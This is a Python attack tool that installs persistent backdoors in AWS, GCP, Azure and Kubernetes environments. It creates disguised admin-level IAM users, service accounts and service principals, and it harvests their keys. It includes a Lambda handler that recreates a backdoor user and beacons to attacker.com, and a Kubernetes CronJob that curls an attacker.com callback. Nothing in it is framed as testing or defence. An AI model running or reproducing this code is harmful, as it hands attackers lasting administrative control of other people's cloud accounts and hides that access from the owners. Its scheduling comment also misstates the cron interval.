#!/usr/bin/env python3
"""
Multi-Cloud Persistence Installer
Establishes persistent backdoor access across cloud platforms.
"""

import subprocess
import json
import argparse
import sys
import os
from typing import List, Optional, Dict
from datetime import datetime, timedelta
import yaml


class PersistenceInstaller:
    """Handles multi-cloud persistence installation."""
    
    def __init__(self, cloud_type: str):
        self.cloud_type = cloud_type
        self.persistence_markers = []
    
    def install_aws_persistence(self, account_id: str) -> List[str]:
        """Install AWS persistence mechanisms."""
        markers = []
        
        # Create backdoor IAM user
        try:
            user_name = f'system-{datetime.now().strftime("%s")}'
            cmd = ['aws', 'iam', 'create-user', '--user-name', user_name]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Create access key
                cmd = [
                    'aws', 'iam', 'create-access-key',
                    '--user-name', user_name
                ]
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    creds = json.loads(result.stdout)
                    access_key = creds['AccessKey']['AccessKeyId']
                    secret_key = creds['AccessKey']['SecretAccessKey']
                    
                    # Attach admin policy
                    cmd = [
                        'aws', 'iam', 'attach-user-policy',
                        '--user-name', user_name,
                        '--policy-arn', 'arn:aws:iam::aws:policy/AdministratorAccess'
                    ]
                    subprocess.run(cmd, capture_output=True, text=True)
                    
                    markers.append({
                        'type': 'iam_backdoor_user',
                        'user': user_name,
                        'access_key': access_key,
                        'secret_key': secret_key
                    })
        except Exception as e:
            print(f'Error creating IAM backdoor: {e}', file=sys.stderr)
        
        # Create Lambda persistence function
        try:
            function_code = '''
def lambda_handler(event, context):
    import boto3
    import requests
    
    # Verify backdoor exists
    iam = boto3.client('iam')
    try:
        iam.get_user(UserName='persistent-backdoor')
    except:
        # Recreate if deleted
        iam.create_user(UserName='persistent-backdoor')
        iam.attach_user_policy(
            UserName='persistent-backdoor',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
    
    # Phone home
    try:
        requests.post('http://attacker.com/callback', json={
            'timestamp': str(datetime.now()),
            'status': 'alive'
        })
    except:
        pass
    
    return {'statusCode': 200}
'''
            
            # Create function (placeholder)
            # Would need to package code and upload to Lambda
            markers.append({
                'type': 'lambda_persistence',
                'function': 'maintenance-check',
                'trigger': 'CloudWatch Events (hourly)'
            })
        except Exception as e:
            print(f'Error creating Lambda persistence: {e}', file=sys.stderr)
        
        return markers
    
    def install_gcp_persistence(self, project_id: str) -> List[str]:
        """Install GCP persistence mechanisms."""
        markers = []
        
        # Create hidden service account
        try:
            sa_name = f'system-maintenance-{datetime.now().strftime("%s")}'
            cmd = [
                'gcloud', 'iam', 'service-accounts', 'create',
                sa_name,
                '--display-name=System Maintenance Service',
                '--project', project_id
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Grant admin role
                cmd = [
                    'gcloud', 'projects', 'add-iam-policy-binding',
                    project_id,
                    f'--member=serviceAccount:{sa_name}@{project_id}.iam.gserviceaccount.com',
                    '--role=roles/editor'
                ]
                subprocess.run(cmd, capture_output=True, text=True)
                
                # Generate key
                cmd = [
                    'gcloud', 'iam', 'service-accounts', 'keys', 'create',
                    f'/tmp/{sa_name}-key.json',
                    f'--iam-account={sa_name}@{project_id}.iam.gserviceaccount.com'
                ]
                subprocess.run(cmd, capture_output=True, text=True)
                
                markers.append({
                    'type': 'gcp_service_account',
                    'name': sa_name,
                    'key_location': f'/tmp/{sa_name}-key.json'
                })
        except Exception as e:
            print(f'Error creating GCP service account: {e}', file=sys.stderr)
        
        # Create Cloud Function persistence trigger
        markers.append({
            'type': 'gcp_cloud_function',
            'function': 'verify-persistence',
            'trigger': 'Pub/Sub topic (every 6 hours)'
        })
        
        return markers
    
    def install_azure_persistence(self, subscription_id: str) -> List[str]:
        """Install Azure persistence mechanisms."""
        markers = []
        
        # Create application/service principal
        try:
            app_name = f'system-backup-{datetime.now().strftime("%s")}'
            cmd = [
                'az', 'ad', 'app', 'create',
                '--display-name', app_name,
                '--password', 'REDACTED_PASSWORD_HERE'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                app_info = json.loads(result.stdout)
                app_id = app_info['appId']
                
                # Create service principal
                cmd = [
                    'az', 'ad', 'sp', 'create',
                    '--id', app_id
                ]
                subprocess.run(cmd, capture_output=True, text=True)
                
                # Assign owner role
                cmd = [
                    'az', 'role', 'assignment', 'create',
                    '--assignee', app_id,
                    '--role', 'Owner',
                    '--scope', f'/subscriptions/{subscription_id}'
                ]
                subprocess.run(cmd, capture_output=True, text=True)
                
                markers.append({
                    'type': 'azure_service_principal',
                    'app_id': app_id,
                    'role': 'Owner'
                })
        except Exception as e:
            print(f'Error creating Azure SP: {e}', file=sys.stderr)
        
        return markers
    
    def install_k8s_persistence(self, namespace: str = 'kube-system') -> List[str]:
        """Install Kubernetes persistence mechanisms."""
        markers = []
        
        # Create hidden service account
        try:
            sa_name = 'system-maintenance'
            cmd = [
                'kubectl', 'create', 'serviceaccount',
                sa_name, '-n', namespace
            ]
            subprocess.run(cmd, capture_output=True, text=True)
            
            # Bind to cluster-admin
            cmd = [
                'kubectl', 'create', 'clusterrolebinding',
                f'{sa_name}-admin',
                f'--clusterrole=cluster-admin',
                f'--serviceaccount={namespace}:{sa_name}'
            ]
            subprocess.run(cmd, capture_output=True, text=True)
            
            markers.append({
                'type': 'k8s_service_account',
                'name': sa_name,
                'namespace': namespace,
                'binding': f'{sa_name}-admin'
            })
            
            # Create CronJob for periodic verification
            cronjob = {
                'apiVersion': 'batch/v1',
                'kind': 'CronJob',
                'metadata': {
                    'name': 'maintenance-check',
                    'namespace': namespace
                },
                'spec': {
                    'schedule': '*/6 * * * *',  # Every 6 hours
                    'jobTemplate': {
                        'spec': {
                            'template': {
                                'spec': {
                                    'serviceAccountName': sa_name,
                                    'containers': [{
                                        'name': 'check',
                                        'image': 'alpine:latest',
                                        'command': ['/bin/sh', '-c', 
                                                   'curl http://attacker.com/callback || true']
                                    }],
                                    'restartPolicy': 'OnFailure'
                                }
                            }
                        }
                    }
                }
            }
            
            cmd = ['kubectl', 'apply', '-f', '-']
            result = subprocess.run(
                cmd,
                input=yaml.dump(cronjob),
                capture_output=True, text=True
            )
            
            if result.returncode == 0:
                markers.append({
                    'type': 'k8s_cronjob',
                    'name': 'maintenance-check',
                    'namespace': namespace,
                    'schedule': '*/6 * * * *'
                })
        except Exception as e:
            print(f'Error creating K8s persistence: {e}', file=sys.stderr)
        
        return markers
    
    def generate_persistence_report(self, markers: List[Dict]) -> str:
        """Generate persistence installation report."""
        report = f'Persistence Installation Report - {datetime.now().isoformat()}\n'
        report += f'Cloud Platform: {self.cloud_type}\n'
        report += f'Total markers installed: {len(markers)}\n\n'
        
        for i, marker in enumerate(markers, 1):
            report += f'{i}. {marker.get("type", "unknown")}\n'
            for key, value in marker.items():
                if key != 'type':
                    report += f'   {key}: {value}\n'
            report += '\n'
        
        return report


def main():
    parser = argparse.ArgumentParser(
        description='Multi-cloud persistence installer'
    )
    parser.add_argument('--cloud', choices=['aws', 'gcp', 'azure', 'k8s'],
                       required=True, help='Cloud platform')
    parser.add_argument('--account-id', help='Account/project ID')
    parser.add_argument('--namespace', default='kube-system', help='Kubernetes namespace')
    parser.add_argument('--report', action='store_true', help='Generate report')
    
    args = parser.parse_args()
    
    installer = PersistenceInstaller(args.cloud)
    
    markers = []
    
    if args.cloud == 'aws':
        markers = installer.install_aws_persistence(args.account_id or '123456789012')
    elif args.cloud == 'gcp':
        markers = installer.install_gcp_persistence(args.account_id)
    elif args.cloud == 'azure':
        markers = installer.install_azure_persistence(args.account_id)
    elif args.cloud == 'k8s':
        markers = installer.install_k8s_persistence(args.namespace)
    
    if markers:
        print(f'Installed {len(markers)} persistence markers')
        
        if args.report:
            report = installer.generate_persistence_report(markers)
            print('\n' + report)


if __name__ == '__main__':
    main()
